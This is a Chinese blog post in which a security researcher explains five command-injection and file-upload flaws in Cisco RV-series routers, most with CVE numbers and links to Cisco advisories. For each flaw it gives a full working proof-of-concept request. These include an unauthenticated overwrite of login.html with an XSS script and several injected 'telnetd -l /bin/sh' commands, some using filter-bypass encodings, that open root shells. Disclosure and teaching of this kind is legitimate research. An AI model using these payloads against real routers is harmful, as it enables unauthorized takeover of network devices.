#  思科企业级路由器0day漏洞挖掘   
原创 信睿网络  信睿网络   2024-05-19 18:38  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBP0icuQJib8oOicDH38kw4M9vsCp8mXrBhV2cY2V6DSBoC5CKYMQ0X9icYA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
******思科企业级路由器0day漏洞挖掘**  
  
  
**前言**  
  
**01**  
  
写这篇文章的初衷是因为有很多师傅问我：零基础小白该如何入手挖设备的二进制洞？很多师傅也许会觉得这是一件很困难的事情。读了这篇文章之后，我相信大家应该能体会到即使像思科这种全球头部大厂也是有很多很水的洞是可以很容易挖到的。  
  
  
今年年初2月份的时候，笔者对美国思科  
**RV**系列部分型号的企业级网关路由器进行了漏洞挖掘，并拿到了多份思科官方的致谢以及获批了多个中高危的  
**CVE**漏洞编号。  
  
笔者在此借这篇文章选择了五个漏洞，简单分享一下这些漏洞的细节以及相关漏洞挖掘经验。由于时间仓促，事情也比较多，笔者之前仅选择了较新的  
**RV34x**以及  
**RV32x**系列（和类似的**RV0xx**系列）设备最新固件对浅层的漏洞进行了挖掘，并未深入，主打一个水编号和混致谢。  
  
希望本文能够给刚入门  
**IoT**安全，想要挖洞但不知如何入手的师傅们带来些帮助。由于篇幅有限，固件仿真模拟等相关内容就不展开了，师傅们可以自行尝试。最后也请各位大师傅们看到我的垃圾洞轻喷。  
  
更多可公开的低质量垃圾漏洞：  
**https://github.com/winmt/my-vuls**，品相较好的洞后面也许会写文章再放出来相关细节。  
  
  
  
******CVE-2023-20073**  
  
  
**漏洞描述**  
  
  
**Cisco RV340**，  
**RV340W**，  
**RV345**和  
**RV345P**型号的企业路由器最新版固件中存在一个**未授权任意文件上传漏洞**，未授权攻击者可通过该漏洞上传并覆写文件，造成存储型  
**XSS**攻击等危害。  
  
  
思科安全通告：  
  
https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sb-rv-afu-EXxwA65V.html  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBM2BOK2DEibOnia8WvRoXekZc0Q445JPvzicxyg4lh3So8nTv41VNicQWPw/640?wx_fmt=other&from=appmsg "")  
  
  
  
**漏洞细节**  
  
  
在配置文件**/etc/nginx/conf.d/rest.url.conf**中，我们注意到当访问**/api/operations/ciscosb-file:form-file-upload**的时候，仅仅检查了**Authorization**字段是否为空。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBaNsUweJcDxu1odPYhulSFBE5Rvj2hr1PTVFXHA6gfMWQnibCicj07Ccw/640?wx_fmt=other&from=appmsg "")  
  
  
如果**Authorization**字段不为空，我们可以上传文件到**/tmp/upload**文件夹，并最终通过**/form-file-upload**调用**uwsgi**去执行**upload.cgi**。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBfVAJVcAa344AWOoaN0TddHSU6JePMNfXCkf1lhyHNgj0Se17r34zGg/640?wx_fmt=other&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBTKCHPQ94Cx5icpPRicia2ZLN07Pa5mLJDNwDgx8ThFNBMElS2Ooico5yww/640?wx_fmt=other&from=appmsg "")  
  
  
在二进制文件**/www/cgi-bin/upload.cgi**中，首先对**multipart/form-data**表单类型的**POST**请求报文进行了解析，通过**boundary=**获取分隔符。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBVQAyYjZ21FFOMcUiaOmiaQvC1PZ8ZmyIWAIuBseEiabjcQZsfzDBtWicBw/640?wx_fmt=other&from=appmsg "")  
  
  
接着，将**POST**报文中的字段存入相关变量中。例如，**pathparam**和**fileparam**字段的内容被存入了**v30**和**v31**变量中。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBrYEOoQAHXHVanzHrbicEaRL3MyeT14U4R9ZWzQicbqO8wvGoVogWjz6A/640?wx_fmt=other&from=appmsg "")  
  
  
然后，通过分离**Cookie**中的**sessionid=xxx**获得**session**值。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBU7WfQY1kpGISGTn5qJyjqD2gr8KticsYOFLJSmEd6SACGlwOODICj8A/640?wx_fmt=other&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBwHO9nQibW0GPz0rlwKhnURkyDIt4Qld2J2rojG8jsdZmCPaQy063VhA/640?wx_fmt=other&from=appmsg "")  
  
  
然而，我们可以直接  
不经过**session**值的校验检查就进入**sub_115EC**函数（这里第一个参数是**pathparam**字段，第三个参数是**fileparam**字段）。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBCWOKaYficQchfRiaicqRRGLEpicrXdXibXLZjMRRdsHHJOIj07IZwU7uEuw/640?wx_fmt=other&from=appmsg "")  
  
  
在**sub_115EC**函数中， 当**a1**（即**pathparam**字段的内容）为**Portal**时，我们可以强制移动之前未经授权上传的文件到**/tmp/www**目录下。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMB259nibhaG9ic8gHmNet8OM6wibZ7SPyWOzuLBGAibvLBjkUXJNV2hgMLJA/640?wx_fmt=other&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBbZ3YeCUmL96BYASMoSHSJ66W2t0kOzMVlibPKBhMedefe5GvHJQs4IQ/640?wx_fmt=other&from=appmsg "")  
  
  
此外，在**/www**目录下，**index.html**和**login.html**文件都是**/tmp/www**目录下同名文件的软链接。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBqk3M6ZXQt1gIiaDyVVsRyuSUpJG6OaV9M5ZPI8rok61pRAT1rdt91Qw/640?wx_fmt=other&from=appmsg "")  
  
  
总之，攻击者可以通过该漏洞不经过权限验证上传任意文件并覆写**login.html**，**index.html**和其他配置文件，造成如存储型**XSS**攻击的危害。  
  
  
**Poc**  
  
  
按照上文漏洞细节描述，容易写出如下攻击报文：  
```
------hacked-by-winmt------
Content-Disposition: form-data; name="pathparam"

Portal
------hacked-by-winmt------
Content-Disposition: form-data; name="fileparam"

login.html
------hacked-by-winmt------
Content-Disposition: form-data; name="file"; filename="login.html"
Content-Type: application/octet-stream

<title>Hacked by winmt!</title>
<script>alert('Hacked by winmt!')</script>
------hacked-by-winmt------
```  
  
  
**攻击演示**  
  
  
攻击前，访问**/login.html**页面正常。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBHR0ejwJgicmgvwKlpqsP17GAG5Ac4KicUYmp0Hewqj8hcoZeKA4W9pHw/640?wx_fmt=other&from=appmsg "")  
  
  
按照上述**Poc**，覆写**login.html**为如下内容攻击（尽管显示**Error Input**，攻击仍然是成功进行的）。  
  
```
<title>Hacked by winmt!</title>
<script>alert('Hacked by winmt!')</script>
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBG2vR8jL526Fs4EjNjSIEdiaKFAmqpia1P2icaXxUicISaocNWR5kSZWQPw/640?wx_fmt=other&from=appmsg "")  
  
  
攻击后，访问**/login.html**页面，可以看到页面已被我们任意篡改，造成了存储型**XSS**攻击。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBOcCuJVOQFrxRhrondojh4txxwVQEgBSiaBIYkYW6nkNJ8qo6vPFVa7A/640?wx_fmt=other&from=appmsg "")  
  
  
  
  
******CVE-2023-20117**  
  
  
**漏洞描述**  
  
  
**Cisco RV320**和**RV325**系列企业级路由器最新固件中存在一个**命令注入**漏洞。通过身份验证的攻击者可通过该漏洞执行任意命令，获取设备的最高控制权。  
  
  
思科安全通告：  
  
https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sb-rv32x-cmdinject-cKQsZpxL.html  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBYtQvvD5RSGuB9vcJ30LHMEAqicXRz4cMPp6pOu8mF6hrcdYy1JKd5Zw/640?wx_fmt=other&from=appmsg "")  
  
  
**漏洞细节**  
  
  
在二进制文件**/usr/local/EasyAccess/www/cgi-bin/ssi.cgi**的**NK_UiConfNeedPasswd**函数中，对**md5_password**字段过滤不严，并  
没有过滤**\n**和**\r**命令分隔符。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBpbele9d4xIDbepIJUBl04BhcMIucmYpd6vbOx0Z2EY9P0VNcBLXic3w/640?wx_fmt=other&from=appmsg "")  
  
  
之后，在满足判断条件后，**md5_password**将会被拼接入**acStack_340**变量中，并直接作为命令被**system**函数执行。  
  
  
简单查找一下关键字，即可知道该漏洞触发的入口在**/sys_setting.htm**：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBtBU82T2UZwFBX3otnWvzxqzxXz7kELaYfia1Wqc2fG2wbTZzF4D7ChA/640?wx_fmt=other&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBbicuRd8oBvr7Bpxqztq8QOQgQciaficQibOK1T1rWGKSbTO9ra8d2BBI7w/640?wx_fmt=other&from=appmsg "")  
  
  
**Poc**  
  
  
访问**/sys_setting.htm**并触发**refresh**操作时抓包，将**POST**报文中**md5_password**字段内容修改如下（表单数据直接换行即可）：  
  
```
11
telnetd -l /bin/sh
```  
  
  
**攻击演示**  
  
  
按上述**Poc**发送请求报文，开启**telnet**服务：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBXQUuY9ibOtsvsFCIWIe3amGFfj41jDMMBJiarViafKXs8pu1RYgicUH91w/640?wx_fmt=other&from=appmsg "")  
  
  
直接通过**telnet**远程登录，获得**root shell**：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBr3qVyXRkPj3BjAOGicRaVKFBlVTs756QiadeIGUdJZ5Av2s8hxo9pRKQ/640?wx_fmt=other&from=appmsg "")  
  
  
  
  
******CVE-2023-20118**  
  
  
**漏洞描述**  
  
  
这其实是一组漏洞，相似的有很多，不过只统一分配了一个CVE编号，笔者这里也随便挑选一个来分析。  
  
  
  
**Cisco RV320**和**RV325**系列（以及**RV016, RV042, RV042G, RV082**系列）企业级路由器最新固件中存在一个**命令注入**漏洞。通过身份验证的攻击者可通过该漏洞执行任意命令，获取设备的最高控制权。  
  
  
思科安全通思科安全通告：  
  
**https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sbr042-multi-vuln-ej76Pke5.html**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBQ6DicNAF5eALMeKDmxffSXn8vXV763tcxXQsY4xjpdIQSxRRqjkLsOg/640?wx_fmt=other&from=appmsg "")  
  
  
**漏洞细节**  
  
  
该漏洞存在于 ****/usr/local/EasyAccess/www/cgi-bin/config.exp**二进制文件中，并同样存在于相似的**/usr/local/EasyAccess/www/cgi-bin/config_mirror.exp****文件中。  
  
  
在主函数中，可见当我们的请求中包含**export_cert&**字符串时，将进入**exportconfig_CertFile**函数。  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBcZCLicjQbwxmX1ULoG89wv9H7JicTkxkdSbZbgB76hfibuhUlgltoDcjg/640?wx_fmt=other&from=appmsg "")  
  
  
在**exportconfig_CertFile**函数中，当最后一个**&**后面的内容是**MY_CA**, 第二个和第三个**&**之间的内容将会被拼接入**acStack1088**变量，并作为**system**函数的参数执行命令。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMB6wyWWic8u9j8e21g69l6wIdHwibHdYib9gibql2ibICPm4GD5BDIUXCib34A/640?wx_fmt=other&from=appmsg "")  
  
  
  
**Poc**  
  
  
然而，在实际测试中，我们发现这些设备过滤（转义）了空格，不过可以用****${IFS}****来代替。  
  
以**POST**请求向[https://192.168.1.1/cgi-bin/config.exp?export_cert&abc&;/usr/sbin/telnetd${IFS}-l${IFS}/bin/sh;&abc&MY_CA发送任意内容的报文。](https://192.168.1.1/cgi-bin/config.exp?export_cert&abc&;/usr/sbin/telnetd$%7BIFS%7D-l$%7BIFS%7D/bin/sh;&abc&MY_CA%E5%8F%91%E9%80%81%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E7%9A%84%E6%8A%A5%E6%96%87%E3%80%82)  
  
  
  
或者：以**POST**请求向**https://192.168.1.1/cgi-bin/config_mirror.exp?export_cert&abc&;/usr/sbin/telnetd${IFS}-l${IFS}/bin/sh;&abc&MY_CA**发送任意内容的报文。  
  
  
**攻击演示**  
  
  
按照上述**Poc**发送请求报文：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBA9nqWu7V5Hud1XClQDXPSvlXZNb3vFuEwTc5B0KYbSerTcI6Z7xsTw/640?wx_fmt=other&from=appmsg "")  
  
  
攻击后，可以通过**telnet**远程登录设备并获得了设备的最高控制权：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBjRtojicOAqichnO4NlAw1F8uVs5WuQwv0BeAibpicP1QLkIKom7ibOLxyEw/640?wx_fmt=other&from=appmsg "")  
  
  
  
  
******CVE-2023-20128**  
  
  
**漏洞描述**  
  
  
**Cisco RV320**和**RV325**系列企业级路由器最新固件中存在一个命令注入漏洞。通过身份验证的攻击者可通过该漏洞执行任意命令，获取设备的最高控制权。  
  
  
思科安全通告：  
  
**https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sb-rv32x-cmdinject-cKQsZpxL.html**  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBPh3OGCzv5yVjqQqUuT4r6CAcOr8b0D6MaA1xUV07897JicMQnm0bG5Q/640?wx_fmt=other&from=appmsg "")  
  
  
  
**漏洞细节**  
  
  
该漏洞存在于****/usr/local/EasyAccess/www/cgi-bin/import_config.cgi****二进制文件中。  
  
  
在**main**函数中，**POST**报文中的前两个表单数据字段通过两组**fgets**函数读取（每组读取四行，作为表单数据字段）。当**form-data**的第一个字段为**1**时，第二个字段中**;**之后的内容被拼接入 **acStack1144**变量中，并作为参数传递给**upgradefromusb**函数。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMByP5wCd6I6B2pUZU4LTPHyQSq7VZQibjWzoeCYx6Z4ibE8Yy5iadaAlIFA/640?wx_fmt=other&from=appmsg "")  
  
  
在**upgradefromusb**函数中，首先通过**FUN_120003860**函数在传递的参数中**(**和**)**之前添加**\**转义（不过对该漏洞利用并没有影响）。然后，将处理后的内容直接拼接入**acStack808**变量中，并作为**system**的参数执行，而未进行任何检查。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMB6tgNtb2uhAJBAf1YwJCvxJ6NqQaVwE2xJvPV4D7VTLr8h5NHuPdSMg/640?wx_fmt=other&from=appmsg "")  
  
  
综上，攻击者  
可以在**POST**请求报文中表单数据的第二个字段的**;**后面注入任意命令并执行。  
  
  
**Poc**  
  
  
发送如下**POST**请求报文即可（注意用**${IFS}**代替空格）：  
```
POST /cgi-bin/import_config.cgi HTTP/1.1
Host: 192.168.1.1
Cookie: mlap=ZfRSjTJvVhNsYLzAUrxDcg==
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------16897455311731203775484527323
Content-Length: 330
Origin: https://192.168.1.1
Referer: https://192.168.1.1/sys_setting.htm
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------16897455311731203775484527323
Content-Disposition: form-data; name="submitrestoreconfig"

1
-----------------------------16897455311731203775484527323
Content-Disposition: form-data; name="USBconfigfile"

USB1;;telnetd${IFS}-l${IFS}/bin/sh;
-----------------------------16897455311731203775484527323--
```  
  
  
**攻击演示**  
  
  
发送上述**Poc**报文：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBHStbYUzZibgejTW92xa1iaj8LPzpsseRsBbEm1Edk5ibiahOboXJ3ETlZA/640?wx_fmt=other&from=appmsg "")  
  
  
攻击后，可远程登录设备并获得**root**权限：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBYwVVWUADp0Xxbxmbmp6BzvOd0B6R1nf6WXkp9Nr84PHEgA1XsuCCjA/640?wx_fmt=other&from=appmsg "")  
  
  
  
**某内部已知漏洞**  
  
  
**漏洞描述**  
  
  
**Cisco RV0xx**系列的设备和**Cisco RV32x**系列的设备固件部分结构相似，于是我也看了下，不过这个漏洞在上报之后得到了厂商的回复：这是一个内部已知的漏洞。个人感觉这个漏洞的绕过相对前几个还复杂些，没想到反而撞洞了2333  
  
  
  
  
**Cisco RV016, RV042, RV042G, RV082**系列企业级路由器最新固件中存在一个**命令注入**漏洞。通过身份验证的攻击者可通过该漏洞执行任意命令，获取设备的最高控制权。  
  
  
**漏洞细节**  
  
  
二进制文件****/usr/local/EasyAccess/www/cgi-bin/ssi.cgi****中存在漏洞。  
  
在**NK_SNMPUpdate**函数中，**POST**报文中的**snmp_Mib2SysName**字段内容存放在**acStack1622**变量中。当**acStack1622**变量中不包含特定的危险字符，则将会被拼接入**acStack1110**字符串中，并用**system**函数执行命令。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBMwUMk1sA2GrLUKNu2lNMEByDrvNnmibrefgLFghlrwic8HOtz6aNsl3g/640?wx_fmt=other&from=appmsg "")  
  
  
  
然而，危险字符**\n**和**\r**在此处并未被过滤。但是在实际测试中，可以发现这个系列的设备会将某些字符进行转义，如代表**\n**的**%0a**将会被转为**%2a**, 即*****符号。根据这个转义规则，容易得到****%ea**将会被转义为我们需要的**\n****；类似地，空格符**%20**也会被转义为其他字符。幸运的是，Tab符**%09**可以替代空格符，并且**%09**在这里不会被转义。因此，我们可以注入形如 ****%ea/usr/sbin/telnetd%09-l%09/bin/sh%ea****的命令绕过这个转义操作。  
  
  
同理，**snmp_Mib2SysContact**  
  
和**snmp_Mib2SysLocation**字段中也可注入命令触发同样的漏洞。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBicqGXfFeMbLM8AXRntkyiaZh2Z3l6P4CzalMYgHZt8RsQYNxhfeDyTGw/640?wx_fmt=other&from=appmsg "")  
  
  
  
**Poc**  
  
  
发送如下报文，  
  
**snmp_Mib2SysName**， **snmp_Mib2SysContact** 和**snmp_Mib2SysLocation**字段中注入恶意命令。  
  
```
POST /sys_snmp.htm HTTP/1.1
Host: 192.168.1.1
Cookie: mlap=FqgbQ5aBA5wTvwGiB8wRcQ==
Content-Length: 249
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://192.168.1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://192.168.1.1/sys_snmp.htm
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

page=sys_snmp.htm&submitStatus=1&log_ch=1&snmpStatusChange=1&snmpStatus=0&snmp_Mib2SysName=router61120c%ea/usr/sbin/telnetd%09-l%09/bin/sh%09-p%091111%ea&snmp_Mib2SysContact=winmt%ea/usr/sbin/telnetd%09-l%09/bin/sh%09-p%092222%ea&snmp_Mib2SysLocation=winmt%ea/usr/sbin/telnetd%09-l%09/bin/sh%09-p%093333%ea&snmp_GetCommunity=public&snmp_SetCommunity=private&snmp_TrapCommunity=public&snmp_SendTrap=
```  
  
  
**攻击演示**  
  
  
发送上述**Poc**中的请求报文。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBFY4BdKQhkcfkDtxnrMjibUPKDjlFfPVWf6SKaiaYJNIMbJG6T8Lxa8CQ/640?wx_fmt=other&from=appmsg "")  
  
  
攻击后，可通过远程登录控制设备（**2222**和**3333**端口也可以）。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMBxOmypmKxNibM39QVS0DqPzdicwLHVjInnLlnTVD67xxwxj4XSCPac7QQ/640?wx_fmt=other&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RbvWEoCT2fRoAyv3ar6ibNXek6tTk9tMByWjy44yr5savzsJvxXiaMAJqJunY1kyHBNHP7uYAVyVQqwULN5VdCjg/640?wx_fmt=png&from=appmsg "")  
  
  
